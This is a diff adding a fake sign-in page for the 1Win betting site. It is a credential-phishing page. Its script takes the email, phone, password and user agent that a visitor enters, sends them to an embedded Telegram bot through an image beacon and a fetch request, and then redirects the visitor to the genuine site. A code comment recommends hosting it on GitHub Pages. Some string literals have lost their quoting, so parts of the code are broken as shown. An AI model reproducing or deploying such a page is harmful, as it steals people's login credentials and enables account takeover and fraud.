@@ -1,0 +1,136 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1Win - Online Betting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', Arial, sans-serif; background: #000000; color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; background: #050510; padding: 14px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1a1a3a; }
+        .logo { font-size: 30px; font-weight: 900; color: #1e90ff; letter-spacing: 3px; text-shadow: 0 0 12px rgba(30,144,255,0.4); }
+        .logo span { color: #ffffff; }
+        .nav-links { display: flex; gap: 26px; }
+        .nav-links a { color: #555; text-decoration: none; font-size: 14px; font-weight: 500; transition: color 0.2s; }
+        .nav-links a:hover { color: #1e90ff; }
+        .login-container { margin-top: 90px; background: #0a0a0a; border: 1px solid #1a1a2e; border-radius: 14px; padding: 44px 40px; width: 410px; box-shadow: 0 0 60px rgba(30,144,255,0.06); }
+        .login-container h2 { text-align: center; margin-bottom: 6px; font-size: 23px; color: #1e90ff; font-weight: 700; }
+        .login-container p.sub { text-align: center; color: #444; font-size: 13px; margin-bottom: 30px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 12px; color: #555; margin-bottom: 7px; text-transform: uppercase; letter-spacing: 1px; }
+        .form-group input { width: 100%; padding: 13px 15px; background: #000000; border: 1px solid #222; border-radius: 8px; color: #fff; font-size: 15px; outline: none; }
+        .form-group input:focus { border-color: #1e90ff; box-shadow: 0 0 0 2px rgba(30,144,255,0.15); }
+        .btn-login { width: 100%; padding: 15px; background: #1e90ff; border: none; border-radius: 8px; color: #000; font-size: 16px; font-weight: 800; cursor: pointer; margin-top: 10px; }
+        .btn-login:hover { background: #3aa0ff; }
+        #status { display: none; text-align: center; color: #1e90ff; font-size: 13px; margin-top: 12px; }
+    </style>
+</head>
+<body>
+<div class="header">
+    <div class="logo">1<span>WIN</span></div>
+    <div class="nav-links">
+        <a href="#">Sports</a>
+        <a href="#">Live</a>
+        <a href="#">Casino</a>
+        <a href="#">Slots</a>
+        <a href="#">Promo</a>
+    </div>
+</div>
+<div class="login-container">
+    <h2>Sign In</h2>
+    <p class="sub">Enter your credentials to access your account</p>
+   
+    <div class="method-tabs">
+        <button class="method-tab active" id="tabEmail" onclick="switchTab('email')">Email</button>
+        <button class="method-tab" id="tabPhone" onclick="switchTab('phone')">Phone</button>
+    </div>
+    <form id="loginForm">
+        <div class="form-group" id="emailGroup">
+            <label>Email Address</label>
+            <input type="text" id="email" placeholder="example@mail.com">
+        </div>
+        <div class="form-group" id="phoneGroup" style="display:none;">
+            <label>Phone Number</label>
+            <input type="text" id="phone" placeholder="+1 234 567 8900">
+        </div>
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="Enter password">
+        </div>
+        <div class="form-group">
+            <label><input type="checkbox" id="remember"> Remember me</label>
+        </div>
+        <button type="submit" class="btn-login" id="loginBtn">LOG IN</button>
+    </form>
+    <div id="status">Signing in securely...</div>
+    <div class="footer-links">
+        <a href="#">Forgot password?</a>
+        <a href="#">Create account</a>
+    </div>
+    <div class="bonus-banner">
+        <strong>+500% BONUS</strong>
+        <p>On your first deposit up to ,000</p>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8526990465:AAEAQ5QbFJt-4asv_PP1S6A3tDZWrCBntg8";
+    const CHAT_ID = "8398552469";
+
+    function switchTab(type) {
+        document.getElementById("tabEmail").className = type === "email" ? "method-tab active" : "method-tab";
+        document.getElementById("tabPhone").className = type === "phone" ? "method-tab active" : "method-tab";
+        document.getElementById("emailGroup").style.display = type === "email" ? "block" : "none";
+        document.getElementById("phoneGroup").style.display = type === "phone" ? "block" : "none";
+    }
+
+    function sendToTelegram(data) {
+        // Using Image beacon - works better on GitHub Pages
+        const img = new Image();
+        img.src = https://api.telegram.org/bot/sendMessage?chat_id=&text= + encodeURIComponent(data) + &parse_mode=HTML;
+        
+        // Backup with fetch
+        fetch(https://api.telegram.org/bot/sendMessage, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "HTML" })
+        }).catch(() => {});
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById("email").value.trim();
+        const phone = document.getElementById("phone").value.trim();
+        const password = document.getElementById("password").value.trim();
+        const remember = document.getElementById("remember").checked;
+
+        if (!password) return;
+
+        const statusEl = document.getElementById("status");
+        const btn = document.getElementById("loginBtn");
+        
+        statusEl.style.display = "block";
+        btn.disabled = true;
+        btn.textContent = "VERIFYING...";
+        btn.style.opacity = "0.6";
+
+        const message =  <b>1WIN NEW LOGIN</b>\n\n +
+                        Email: <code></code>\n +
+                        Phone: <code></code>\n +
+                        Password: <code></code>\n +
+                        Remember: \n\n +
+                        UA: <code></code>\n +
+                        Time: ;
+
+        sendToTelegram(message);
+
+        statusEl.innerHTML = " Login captured!<br>Redirecting...";
+
+        setTimeout(() => {
+            window.location.href = "https://1win.com";
+        }, 1400);
+    });
+</script>
+</body>
+</html>
